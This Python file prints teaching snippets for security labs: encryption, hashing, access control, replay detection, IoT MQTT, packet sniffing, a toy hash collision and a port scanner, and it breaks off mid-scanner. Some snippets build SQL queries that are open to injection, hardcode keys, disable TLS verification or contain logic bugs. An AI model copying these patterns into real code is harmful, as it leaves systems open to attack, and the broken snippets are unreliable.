from colorama import Fore, Style, init

init(autoreset=True)

def vp_1():
    print(Fore.RED + '''


#Confidentiality - Fernet

from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
message = "This message is to be encoded and decoded using AES encryption."
encrypted = cipher.encrypt(message.encode())
decrypted = cipher.decrypt(encrypted).decode()
print(f"\nKey:", key.decode())
print(f"Encrypted:", encrypted)
print(f"Decrypted:", decrypted, "\n")


#Integrity - SHA-256

import hashlib
data = "The melancholy of Haruhi Suzumiya"
hash1 = hashlib.sha256(data.encode()).hexdigest()
tampered = "The MELANCHOLY of Haruhi Suzumiya"
hash2 = hashlib.sha256(tampered.encode()).hexdigest()
print("\nHash1:", hash1)
print("Hash2:", hash2)
print(f"Integrity Verified?", hash1 == hash2, "\n")

#Availability - Backup

import shutil

original_file = 'sample.txt'
backup_file = 'backup_data.txt'
shutil.copyfile(original_file, backup_file)
print("Backup completed!")


#Authentication - User $ Pass Check

users = {
'admin': 'admin123',
'user123': 'password123'
}
username = input("\nEnter username: ")
password = input("Enter password: ")
if users.get(username) == password:
    print("Access granted\n")
else:
    print("Access denied\n")


#Non-Repudiation - Digital Signature

import hashlib


message = "The sent message to be signed"
signature = hashlib.sha256(message.encode()).hexdigest()
received_message = "The received message to be signed"
received_signature = hashlib.sha256(received_message.encode()).hexdigest()
print(f"\nSignature Verified:", signature == received_signature,'\n')

#Accountability - Logging

import datetime


def log_action(user, action):
   with open("audit_log.txt", "a") as log:
       timestamp = datetime.datetime.now()
       log.write(f"{timestamp} - {user}: {action}\n")
log_action("admin", "Logged In")
log_action("user1", "Viewed Report")

          ''')
    
def vp_2():
    print(Fore.RED + '''


#User auth - Password Encryption

import hashlib

users = {}
def hash_password(password):
   return hashlib.sha256(password.encode()).hexdigest()

def register(username, password):
   users[username] = hash_password(password)
   print("Registered Successfully!")
def login(username, password):
   if users.get(username) == hash_password(password):
       print("Access Granted!")
   else:
       print("Access Denied!")

# Demo
register("admin", "securepass")
login("admin", "securepass")
login("admin", "wrongpass")


#Role Based File Access - Read/Write perms

permissions = {
"admin": ["read", "write"],
"user1": ["read"]
}
def access_file(user_role, action):
   if action in permissions.get(user_role, []):
       print(f"{user_role} can {action} the file ")
   else:
       print(f"{user_role} cannot {action} the file ")


access_file("admin", "write")
access_file("user1", "write")


#File Encryption - AES

from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open("encrypted.key", "wb") as filekey:
   filekey.write(key)

def encrypt_file(filename):
   with open("encrypted.key", "rb") as filekey:
       key = filekey.read()
       fernet = Fernet(key)
   with open(filename, "rb") as file:
       data = file.read()
       encrypted = fernet.encrypt(data)
   with open(filename, "wb") as file:
       file.write(encrypted)
       print("File encrypted")

encrypt_file("sample.txt")


#File Integrity - Anti Tamper

import hashlib

def get_file_hash(filename):
   with open(filename, 'rb') as f:
       return hashlib.sha256(f.read()).hexdigest()
  
original_hash = get_file_hash("sample.txt")
current_hash = get_file_hash("sample.txt")

if original_hash == current_hash:
   print(" File is intact")
else:
   print(" File has been changed!")


#Firewall Simulation

blocked_ips = ["192.168.1.100", "10.0.0.5"]
def check_access(ip):
   if ip in blocked_ips:
       print(f"Access denied for {ip}")
   else:
       print(f"Access granted for {ip}")

check_access("192.168.1.100")
check_access("8.8.8.8")


#Activity Logging 

import datetime

def log_activity(user, action):
   with open("access.log", "a") as logfile:
       time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


       logfile.write(f"[{time}] {user} -> {action}\n")

log_activity("admin", "Accessed Settings")
log_activity("guest", "Tried to Delete File")
print("File Created")

#Memory Allocation

memory = [None] * 100

def allocate(process_id, size):
   for i in range(len(memory) - size + 1):
       if all(block is None for block in memory[i:i+size]):
           for j in range(i, i+size):
               memory[j] = process_id
       return f"Allocated {size} blocks to {process_id} at {i}"
   return "Insufficient memory"

def deallocate(process_id):
   count = memory.count(process_id)
   for i in range(len(memory)):
       if memory[i] == process_id:
           memory[i] = None
       return f"Deallocated {count} blocks from {process_id}"

print(allocate("P1", 10))
print(allocate("P2", 20))
print(deallocate("P1"))


#Memory Monitor

import os, psutil

process = psutil.Process(os.getpid())
print(f" Current Memory Usage: {process.memory_info().rss / 1024**2:.2f} MB")


#Garbage Collection

import gc
import sys

a = [1] * (10**6)
print("Memory used:", sys.getsizeof(a), "bytes")
del a
gc.collect()
print("Garbage collected")


#Paging Simulation

import math

def paging_simulator(process_size, page_size):
   num_pages = math.ceil(process_size / page_size)
   page_table = {f"Page {i}": f"Frame {i}" for i in range(num_pages)}
   return page_table

table = paging_simulator(1024, 256)
for k, v in table.items():
   print(f"{k} → {v}")


#Memory Leak Simul 

import tracemalloc
tracemalloc.start()
def leak_memory():
   leaky_list = []
   for _ in range(100000):
       leaky_list.append("leak" * 1000)
   return leaky_list
   leak_memory()

snapshot = tracemalloc.take_snapshot()
top_stats = snapshot.statistics("lineno")
print(" Memory Leak Detected at:")
for stat in top_stats[:3]:
   print(stat)


#Buffer Overflow Simulation

def safe_array_write(array, index, value):
   if index < len(array):
       array[index] = value
       return " Value written"
   else:
       return " Buffer Overflow Attempt!"

arr = [0] * 5
print(safe_array_write(arr, 2, 10))
print(safe_array_write(arr, 10, 10))

''')
    
def vp_3():
    print(Fore.RED + '''

        
#RSA Key Generation

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

with open("sender_private_key.pem", "wb") as f:
    f.write(private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
))

with open("sender_public_key.pem", "wb") as f:
    f.write(public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
))
   
with open("receiver_private_key.pem", "wb") as f:
    f.write(private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
))

with open("receiver_public_key.pem", "wb") as f:
    f.write(public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
))

print("RSA keys generated and saved.")


#Message Encrypter

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization

with open("receiver_public_key.pem", "rb") as f:
    receiver_public_key = serialization.load_pem_public_key(f.read())

with open("sender_private_key.pem", "rb") as f:
    sender_private_key = serialization.load_pem_private_key(f.read(), password=None)
    message = b"This message is to be sent safely"
    encrypted_message = receiver_public_key.encrypt(message,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(), label=None)
)

signature = sender_private_key.sign(
    message,
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
    salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)

with open("encrypted_message.bin", "wb") as f:
    f.write(encrypted_message)

with open("signature.bin", "wb") as f:
    f.write(signature)

print("Message encrypted and signed.")

#Message Decrypter

with open("receiver_private_key.pem", "rb") as f:
    receiver_private_k= serialization.load_pem_private_key(f.read(),password=None)


with open("sender_public_key.pem", "rb") as f:
    sender_public_key = serialization.load_pem_public_key(f.read())


with open("encrypted_message.bin", "rb") as f:
    encrypted_message = f.read()


with open("signature.bin", "rb") as f:
    signature = f.read()
    decrypted_message = receiver_private_key.decrypt(encrypted_message, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(), label=None)
)

    print(" Decrypted Message:", decrypted_message.decode())

    try:
        sender_public_key.verify(
        signature,
        decrypted_message,
        padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH),
        hashes.SHA256()
        )
        print(" Signature Verified. Message is authentic.")
    except Exception as e:
        print(" Signature verification failed:", e)


          ''')
    
def vp_4():
    print(Fore.RED + '''


#DB Input Validation          

import sqlite3

conn = sqlite3.connect('students.db')
cursor = conn.cursor()

cursor.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT)")
cursor.execute("INSERT INTO users VALUES ('admin', 'admin123')")
conn.commit()

username = input("Enter username: ")
password = input("Enter password: ")

query = f"SELECT * FROM users WHERE username = '{username}' AND password ='{password}'"
cursor.execute(query)

# cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?",(username, password))

result = cursor.fetchone()
print(result)

if result:
    print("Login successful!")
else:
    print("Invalid credentials.")



#DB Encrypt

import sqlite3
import bcrypt

conn = sqlite3.connect('secure_users.db')
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT)")
conn.commit()

username = input("Enter username: ")
raw_password = input("Enter password: ")

hashed = bcrypt.hashpw(raw_password.encode(), bcrypt.gensalt())
cursor.execute("INSERT INTO users VALUES (?, ?)", (username, hashed))
conn.commit()

login_user = input("Username to login: ")
login_pass = input("Password to login: ")
cursor.execute("SELECT password FROM users WHERE username = ?", (login_user,))

data = cursor.fetchone()
if data and bcrypt.checkpw(login_pass.encode(), data[0]):
    print("Login successful.")
else:
    print("Login failed.")


#RBAC DB

import sqlite3

conn = sqlite3.connect('rbac.db')
cursor = conn.cursor()

cursor.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT,role TEXT)")

cursor.execute("INSERT INTO users VALUES ('admin', 'admin123', 'admin')")
cursor.execute("INSERT INTO users VALUES ('john', 'john123', 'student')")

conn.commit()
username = input("Enter username: ")
password = input("Enter password: ")

cursor.execute("SELECT role FROM users WHERE username=? AND password=?", (username, password))

user = cursor.fetchone()
if user:
    role = user[0]
    print(f"Login successful. Your role is: {role}")


    if role == 'admin':
        print("Access granted to view, add, delete, modify records.")
    elif role == 'student':
        print("Access granted to view records only.")
    else:
        print("Limited access.")
else:
    print("Invalid credentials.")




#DB Fields Encrypt

from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

data = "Classified military documents"
enc_data = cipher.encrypt(data.encode())

dec_data = cipher.decrypt(enc_data).decode()
print(f"\nDecrypted:", dec_data, '\n')
          ''')

def vp_5():
    print(Fore.RED + '''

          
#Network security User Res + Login

import sqlite3
import hashlib
import secrets

def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users ( username TEXT PRIMARY KEY, salt TEXT NOT NULL, password_hash TEXT NOT NULL
    )
    """)
    conn.commit()
    conn.close()

def hash_password(password, salt=None):
    if not salt:
        salt = secrets.token_hex(16)
    hash_val = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
    return salt, hash_val.hex()

def register_user(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
    if cursor.fetchone():
        conn.close()
        return "Username already exists."
    salt, password_hash = hash_password(password)
    cursor.execute('INSERT INTO users (username, salt, password_hash) VALUES (?, ?, ?)',
    (username, salt, password_hash))
    conn.commit()
    conn.close()
    return "User registered successfully."

def authenticate_user(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT salt, password_hash FROM users WHERE username = ?',
    (username,))
    result = cursor.fetchone()
    conn.close()
    if not result:
        return False
    salt, stored_hash = result
    _, input_hash = hash_password(password, salt)
    return input_hash == stored_hash

if __name__ == "__main__":
    init_db()
    print(register_user("johndoe", "john@123"))
    print(register_user("johndoe", "anotherpass"))
    print("Login success?" , authenticate_user("johndoe", "john@123"))
    print("Login success?" , authenticate_user("alice", "wrongpass"))



#Timestamp Attack Detection

Server:

import socket
import sqlite3
import hashlib
import secrets
from datetime import datetime, timedelta
from user_auth import authenticate_user, init_db

init_db()
class MessageReceiver:
    def __init__(self):
        self.last_timestamp = None
        self.replay_window = timedelta(seconds=30)
       
    def verify_timestamp(self, timestamp_str):
        try:
            msg_time = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
            now = datetime.utcnow()
            if self.last_timestamp and msg_time <= self.last_timestamp:
                return False, " Replay attack detected: Old timestamp."
            if abs(now - msg_time) > self.replay_window:
                return False, " Timestamp too old or too far in future."
            self.last_timestamp = msg_time

            return True, " Timestamp is valid."
        except ValueError:
            return False, " Invalid timestamp format."

server = socket.socket()
server.bind(('localhost', 9999))
server.listen(1)
print(" Server listening on port 9999...")
conn, addr = server.accept()
print(f" Connected by {addr}")

# Step 1: Receive login details
username = conn.recv(1024).decode()

conn.send(b"SEND_PASSWORD")  # send acknowledgment
password = conn.recv(1024).decode()

if authenticate_user(username, password):
    conn.send(b"AUTH_OK")
    print(" Authenticated:", username)

    # Step 2: Replay Protection
    receiver = MessageReceiver()
    while True:
        data = conn.recv(1024).decode()
        if not data:
            break
        try:
            msg, timestamp_str = data.split("||")
        except ValueError:
            conn.send(b"ERROR: Invalid message format")
            continue
        valid, response = receiver.verify_timestamp(timestamp_str)
        print(f" [{username}] {msg} @ {timestamp_str} > {response}")
        conn.send(response.encode())
else:
    conn.send(b"AUTH_FAILED")
    print(" Authentication failed.")
    conn.close()


Client:

import socket
from datetime import datetime, timezone
import time
client = socket.socket()
client.connect(("localhost", 9999))

client.send(b"johndoe")
ack = client.recv(1024)
client.send(b"john@123")
auth_response = client.recv(1024)

print(auth_response)
if auth_response != b"AUTH_OK":
    print(" Login failed.")
    client.close()
else:
    print(" Login successful.")

while True:
    msg = input(" Enter message (or 'exit'): ")

    if msg == "exit":
        break
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"{msg}||{timestamp}"
    client.send(full_msg.encode())
   
    server_response = client.recv(1024).decode()
    print(" Server:", server_response)
    time.sleep(2)
    print("\n[Replaying same message...]")
    client.send(full_msg.encode())
    print(" Server:", client.recv(1024).decode())




#Encrypted File Transfer

Server: 

import socket
import json
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from user_auth import authenticate_user, init_db

AES_KEY = b"thisis16byteskey"  # 16 bytes
aesgcm = AESGCM(AES_KEY)

def recv_exact(sock, num_bytes):
    data = b''
    while len(data) < num_bytes:
        part = sock.recv(num_bytes - len(data))
        if not part:
            raise ConnectionError("Connection lost")
        data += part
    return data

init_db()
server = socket.socket()
server.bind(('localhost', 8888))
server.listen(1)
print("File Server listening on port 8888...")
conn, addr = server.accept()
print(f"Connected by {addr}")

username = conn.recv(1024).decode()
conn.send(b"SEND_PASSWORD")
password = conn.recv(1024).decode()

if authenticate_user(username, password):
    conn.send(b"AUTH_OK")
    print("Authenticated:", username)

    # Step 1: Receive nonce (12 bytes)
    nonce = recv_exact(conn, 12)

    # Step 2: Receive metadata length (4 bytes)
    metadata_len = int(recv_exact(conn, 4).decode())

    # Step 3: Receive metadata
    metadata_json = recv_exact(conn, metadata_len).decode()
    metadata = json.loads(metadata_json)
    filename = metadata["filename"]
    file_size = metadata["file_size"]

    # Step 4: Receive encrypted file
    encrypted_data = recv_exact(conn, file_size)

    try:
        decrypted = aesgcm.decrypt(nonce, encrypted_data, None)
        with open("received_" + filename, 'wb') as f:
            f.write(decrypted)
        conn.send(b"File received and decrypted.")
        print(f"File saved: received_{filename}")
    except Exception as e:
        print("Decryption failed:", e)
        conn.send(b"File decryption failed.")
else:
    conn.send(b"AUTH_FAILED")
    conn.close()




Client:

import socket
import json
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

AES_KEY = b"thisis16byteskey"  # 16 bytes
aesgcm = AESGCM(AES_KEY)
client = socket.socket()
client.connect(('localhost', 8888))

client.send(b"johndoe")
ack = client.recv(1024)
client.send(b"john@123")

if client.recv(1024) != b"AUTH_OK":
    print("Login failed.")
    client.close()
    exit()

print("Logged in. Ready to send file.")

filename = "sample.txt"
with open(filename, 'rb') as f:
    file_data = f.read()

nonce = os.urandom(12)
encrypted_data = aesgcm.encrypt(nonce, file_data, None)

# Send nonce
client.send(nonce)

# Send metadata as JSON
metadata = {
    "filename": filename,
    "file_size": len(encrypted_data)
}
metadata_json = json.dumps(metadata).encode()
client.send(f"{len(metadata_json):04}".encode())  # Send metadata length first (4-byte)
client.send(metadata_json)

# Send encrypted file
client.sendall(encrypted_data)

print(" Server:", client.recv(1024).decode())
client.close()


#Password based login replaced with RSA public-key authentication

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

with open("client_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL,
    serialization.NoEncryption()
))

with open("client_public.pem", "wb") as f:
    f.write(public_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
))




RSA Server:
import socket
import os
import secrets
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes

with open("client_public.pem", "rb") as f:
    client_public_key = serialization.load_pem_public_key(f.read())

server = socket.socket()
server.bind(('localhost', 7777))
server.listen(1)
print(" RSA Server running...")

conn, addr = server.accept()

print(" Connected by", addr)

challenge = secrets.token_bytes(32)
conn.send(challenge)

signature = conn.recv(512)
try:
    client_public_key.verify(
    signature,
    challenge,
    padding.PKCS1v15(),
    hashes.SHA256()
    )
    conn.send(b"AUTH_OK")
    print(" RSA Authentication Successful")
except Exception as e:
    conn.send(b"AUTH_FAILED")
    print(" RSA Authentication Failed:", str(e))

conn.close()



RSA Client:

import socket
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes

with open("client_private.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

client = socket.socket()
client.connect(('localhost', 7777))

challenge = client.recv(1024)

signature = private_key.sign(
    challenge,
    padding.PKCS1v15(),
    hashes.SHA256()
)

client.send(signature)

response = client.recv(1024).decode()
print(" Server:", response)

client.close()

          ''')

def vp_6():
    print(Fore.RED + '''


#Cloud Security - Secure file upload and access on cloud with encryption and access control

#Cloud Encrypt:

import boto3
from cryptography.fernet import Fernet
import sqlite3
import os

def get_user_role(username):
   conn = sqlite3.connect('cloud_users.db')
   c = conn.cursor()
   c.execute('SELECT role FROM users WHERE username=?', (username,))
   result = c.fetchone()
   conn.close()
   return result[0] if result else None

def encrypt_file(filename, key_file="aes.key"):
   with open(key_file, "rb") as f:
       key = f.read()
   fernet = Fernet(key)
   with open(filename, "rb") as file:
       original = file.read()
   encrypted = fernet.encrypt(original)
   with open("enc_" + filename, "wb") as enc_file:
       enc_file.write(encrypted)
   return "enc_" + filename

def upload_to_s3(file_path, bucket_name="cloud-sec-bucket"):
   try:
       if not os.path.exists(file_path):
           print(f"Error: File {file_path} not found")
           return False
      
       file_size = os.path.getsize(file_path)
       print(f" Simulating upload of {file_path} ({file_size} bytes) to bucket {bucket_name}")
       print(f" Upload successful! (Simulated)")
       print(f" File would be accessible at: s3://{bucket_name}/{file_path}")
       return True
      
   except Exception as e:
       print(f"Upload simulation failed: {e}")
       return False

# --- Main logic ---
if __name__ == "__main__":
   username = input(" Enter your username: ")
   role = get_user_role(username)
   if role != "admin":
       print("Access Denied. Only admin can upload.")
   else:
       file_to_upload = input(" Enter file name to upload: ")
       enc_file = encrypt_file(file_to_upload)
       upload_to_s3(enc_file)



Cloud decrypt:

import boto3
from cryptography.fernet import Fernet
import sqlite3
import os

def get_user_role(username):
   conn = sqlite3.connect('cloud_users.db')
   c = conn.cursor()
   c.execute('SELECT role FROM users WHERE username=?', (username,))
   result = c.fetchone()
   conn.close()
   return result[0] if result else None

def download_from_s3(file_name, bucket_name="cloud-sec-bucket"):
   try:
       if os.path.exists(file_name):
           print(f" File {file_name} already exists locally")
           print(f" Simulating download of {file_name} from bucket {bucket_name}")
           print(f" Download successful! (Simulated)")
           return True
       else:
           print(f" Error: File {file_name} not found locally")
           print(f" In a real scenario, this would be downloaded from s3://{bucket_name}/{file_name}")
           return False
          
   except Exception as e:
       print(f"Download simulation failed: {e}")
       return False
  
def decrypt_file(enc_file, key_file="aes.key"):
   with open(key_file, "rb") as f:
       key = f.read()
   fernet = Fernet(key)
   with open(enc_file, "rb") as f:
       encrypted_data = f.read()
   decrypted = fernet.decrypt(encrypted_data)
   out_file = "dec_" + enc_file.replace("enc_", "")
   with open(out_file, "wb") as f:
       f.write(decrypted)
   print(f" Decrypted file saved as: {out_file}")

if __name__ == "__main__":
   username = input(" Enter your username: ")
   role = get_user_role(username)
   if role not in ("admin", "viewer"):
       print(" Unauthorized user.")
   else:
       file_name = input(" Enter file to download (e.g., enc_sample.txt): ")
       if download_from_s3(file_name):
           decrypt_file(file_name)
       else:
           print(" Download failed. Cannot proceed with decryption.")



#Temporary Download Link:

from flask import Flask, send_file, request, abort
from datetime import datetime, timedelta
import secrets

app = Flask(__name__)
TOKENS = {}

@app.route("/generate_link")
def generate_link():
   token = secrets.token_urlsafe(16)
   expiry = datetime.now() + timedelta(seconds=30)
   TOKENS[token] = expiry
   return f"""
       Temporary link created. Use it within 30 seconds:&lt;br&gt;&lt;br&gt;
       &lt;a href="/download?token={token}"&gt;Download Link&lt;/a&gt;
       """

@app.route("/download")
def download():
   token = request.args.get("token")
   if token in TOKENS:


       if datetime.now() < TOKENS[token]:
           return send_file("sample.txt", as_attachment=True)
   else:
       return " Link expired. Please generate a new one."
   abort(403)

if __name__ == "__main__":
   app.run(debug=True)


#Client Side Encrypted Backup - Zero Trust

from cryptography.fernet import Fernet
import os
import shutil

# Create a simulated cloud folder
os.makedirs("cloud_backup", exist_ok=True)

# Step 1: Generate a secret key (AES)
key = Fernet.generate_key()

fernet = Fernet(key)

with open("aes.key", "wb") as kf:
   kf.write(key)

# Step 2: Encrypt the file
def encrypt_file(file_path):
   with open(file_path, "rb") as f:
       data = f.read()
       
   encrypted_data = fernet.encrypt(data)

   encrypted_file_path = "enc_" + os.path.basename(file_path)
   with open(encrypted_file_path, "wb") as ef:
       ef.write(encrypted_data)

   # Simulate cloud upload (just copying)
   shutil.copy(encrypted_file_path, os.path.join("cloud_backup", encrypted_file_path))
   print(f"Encrypted and uploaded: {encrypted_file_path}")

if __name__ == "__main__":
   input_file = "sample_file.txt"

# Create file if not present
if not os.path.exists(input_file):
   with open(input_file, "w") as f:
       f.write("Confidential Cloud Backup File")

encrypt_file(input_file)


#IDS - Cloud Access Logs

import json
from datetime import datetime

blacklisted_ips = ["192.168.1.10", "10.0.0.5"]

with open("logs.json") as f:
   logs = json.load(f)

failed_attempts = {}

print("\n Intrusion Detection Log Analysis:\n")

for entry in logs:
   user = entry["user"]
   ip = entry["ip"]
   time = datetime.strptime(entry["timestamp"], "%Y-%m-%d %H:%M:%S")
   status = entry["status"]

if ip in blacklisted_ips:
   print(f" ALERT: Access from blacklisted IP {ip} by user '{user}'")

if not (8 <= time.hour <= 18):
   print(f" Off-hour login attempt by '{user}' at {time.strftime('%H:%M')}")

if status == "failed":
   failed_attempts[user] = failed_attempts.get(user, 0) + 1
   if failed_attempts[user] >= 2:
       print(f" User '{user}' has {failed_attempts[user]} failed login attempts!")

print("\n Log scan completed.\n")


#Invisible Watermarking

import hashlib
import os
import shutil

os.makedirs("cloud_upload", exist_ok=True)

def watermark_text(file_path, user_id):
   with open(file_path, "r") as f:
       content = f.read()

   watermark = f"\n<!--USER-ID: {hashlib.sha256(user_id.encode()).hexdigest()}-->"
   watermarked_file = "wm_" + os.path.basename(file_path)
   with open(watermarked_file, "w") as f:
       f.write(content + watermark)

   cloud_path = os.path.join("cloud_upload", watermarked_file)
   shutil.copy(watermarked_file, cloud_path)
   
   print(f" File watermarked and uploaded to: {cloud_path}")

if __name__ == "__main__":
   input_file = "sample_file.txt"

if not os.path.exists(input_file):
   with open(input_file, "w") as f:
       f.write("This is confidential content for cloud storage.")

watermark_text(input_file, user_id="user123")
          ''')
      
def vp_7():
    print(Fore.RED + '''


#AES Encryption for sensor data

from Crypto.Cipher import AES
import base64

key = b"ThisIsA16ByteKey"
cipher = AES.new(key, AES.MODE_EAX)

sensor_data = "Air Quality Index: 30"

ciphertext, tag = cipher.encrypt_and_digest(sensor_data.encode())
nonce = cipher.nonce
print(f"\nEncrypted Data: {base64.b64encode(ciphertext).decode()}")

cipher_dec = AES.new(key, AES.MODE_EAX, nonce=nonce)
decrypted_data = cipher_dec.decrypt(ciphertext).decode()
print(f"Decrypted Data: {decrypted_data}\n")



#HMAC Integrity

import hmac
import hashlib

secret_key = b"iot_secret_key"
message = b"Sigma: 100%"

hmac_digest = hmac.new(secret_key, message, hashlib.sha256).hexdigest()
print(f"\nMessage: {message.decode()}")
print(f"Generated HMAC: {hmac_digest}")

received_hmac = hmac.new(secret_key, message, hashlib.sha256).hexdigest()

if hmac.compare_digest(hmac_digest, received_hmac):
   print(f"Message is authentic\n")
else:
   print(f"Message tampered!\n")



#MQTT with TLS Security

import paho.mqtt.client as mqtt
import ssl

def on_connect(client, userdata, flags, rc, properties):
   print(f"\nConnected with result code {rc}")
   client.subscribe("iot/device1")

def on_message(client, userdata, msg):
   print(f"Received: {msg.topic} {msg.payload.decode()}")

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_connect = on_connect
client.on_message = on_message

client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)

client.connect("test.mosquitto.org", 8883, 60)

client.loop_start()
client.publish("iot/device1", "Secured Temperature Data: 25C")
import time
time.sleep(5)

client.loop_stop()
client.disconnect()


#Packet Sniffing

from scapy.all import sniff

def packet_callback(packet):
   if packet.haslayer("IP"):
       src = packet["IP"].src
       dst = packet["IP"].dst
       print(f"[IP Packet] {src} → {dst}")
       if packet.haslayer("Raw"):
           payload = packet["Raw"].load
           print("Payload:", payload)

print(" Sniffing IoT traffic... Press Ctrl+C to stop")
sniff(prn=packet_callback, count=10)

          ''')
                   
def vp_8():
    print(Fore.RED + '''

          
def toy_hash(b: bytes) -> int:
   return sum(b) % 256

def make_base_certs():
   cert1_txt = """-----BEGIN CERTIFICATE-----
Subject: CN=Alice Example
Issuer: Test CA
PublicKey: AAAAB3NzaC1yc2EAAAADAQABAAABAQCu
-----END CERTIFICATE-----
"""
   cert2_txt = """-----BEGIN CERTIFICATE-----
Subject: CN=Bob Example
Issuer: Test CA
PublicKey: AAAAB3NzaC1yc2EAAAADAQABAAABAQCu
-----END CERTIFICATE-----
"""
   return cert1_txt.encode('utf-8'), cert2_txt.encode('utf-8')

def pad_to_match(hash_target: int, current_bytes: bytes) -> bytes:
   cur = sum(current_bytes) % 256
   needed = (hash_target - cur) % 256  # amount we must add (0..255)
   if needed == 0:
       return b''

   if 0 <= needed <= 255:
       return bytes([needed])
   hi = needed // 256
   lo = needed % 256
   return bytes([hi, lo])

def main():
   cert1, cert2 = make_base_certs()
   h1 = toy_hash(cert1)
   h2 = toy_hash(cert2)
   print("Initial toy hashes:")
   print(" cert1 hash:", h1)
   print(" cert2 hash:", h2)
   print()
  
   padding = pad_to_match(h1, cert2)
   cert2_padded = cert2 + b"\n#PAD:" + padding 
   h2_after = toy_hash(cert2_padded)
     
   print("After padding cert2:")
   print(" cert1 length:", len(cert1), "hash:", toy_hash(cert1))
   print(" cert2_padded length:", len(cert2_padded), "hash:", h2_after)
   print()
  
   print("Are bytes identical?:", cert1 == cert2_padded)
   print("Do they collide under toy_hash?:", toy_hash(cert1) == toy_hash(cert2_padded))
   print()
  
   def show_tail(b):
       tail = b[-40:]
       return tail.hex()
  
   print("tail(cert1) (hex):", show_tail(cert1))
   print("tail(cert2_p) (hex):", show_tail(cert2_padded))
  
   with open("cert1_demo.pem", "wb") as f:
       f.write(cert1)
   with open("cert2_demo_padded.pem", "wb") as f:
       f.write(cert2_padded)

   print("\nWrote cert1_demo.pem and cert2_demo_padded.pem to disk (different files).")
   print("You can show students: files differ, but toy_hash(...) is the same.")
if __name__ == "__main__":
   main()


#HASH

import hashlib

message = "Hello Security Students".encode()
hash_digest = hashlib.sha256(message).hexdigest()

print("SHA256 Hash:", hash_digest)



#MAC

import hmac, hashlib

secret_key = b"shared_secret"
message = b"Important Transaction: $500"

mac = hmac.new(secret_key, message, hashlib.sha256).hexdigest()

print("Message:", message.decode())
print("MAC:", mac)




#HMAC

import hmac, hashlib

key = b"super_secret_key"
msg = b"Authenticate this message"

hmac_digest = hmac.new(key, msg, hashlib.sha256).hexdigest()
print("HMAC:", hmac_digest)

          ''')
    
def vp_9():
    print(Fore.RED + '''


#Port Scanning, Banner Grabbing and Vulnerability check

import socket
from datetime import datetime

vulnerabilities = {
"Apache/2.2.8": "Outdated Apache version - vulnerable to CVE-2009-3555",
"OpenSSH_4.7": "Old OpenSSH version - possible remote exploits",
"Microsoft-IIS/6.0": "IIS 6.0 is deprecated - vulnerable to multiple attacks"
}

def scan_ports(target, ports):
    open_ports = []
    print(f"\n[*] Scanning {target} ...")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is OPEN")
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

def grab_banner(ip, port):
    try:
        sock = socket.socket()
        sock.settimeout(1)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except:
        return None

def check_vulnerabilities(banner):
    for vuln in vulnerabilities:
        if vuln in banner:
            return vulnerabilities[vuln]
    return "No known vulnerability in database."

if __name__ == "__main__":
    target = input("Enter Target IP (e.g., 127.0.0.1): ")
    ports_to_scan = [21, 22, 23, 25, 80, 110, 143, 443, 3389]
   
    start_time = datetime.now()
